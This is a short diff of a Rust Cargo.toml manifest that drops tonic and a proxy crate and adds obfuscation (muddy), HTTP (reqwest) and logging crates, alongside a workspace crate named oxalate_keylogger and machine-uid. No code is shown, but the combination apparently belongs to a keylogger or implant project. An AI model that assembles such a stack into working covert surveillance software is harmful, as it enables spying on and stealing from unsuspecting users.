@@ -5,7 +5,10 @@ edition = "2024"
 
 [dependencies]
 oxalate_keylogger = { workspace = true }
-tonic = { workspace = true }
 tokio = { workspace = true }
-oxalate_proxy = { workspace = true }
 machine-uid = "0.5.4"
+muddy = "0.3.2"
+once_cell = "1.21.3"
+reqwest = "0.12.24"
+log.workspace = true
+env_logger.workspace = true
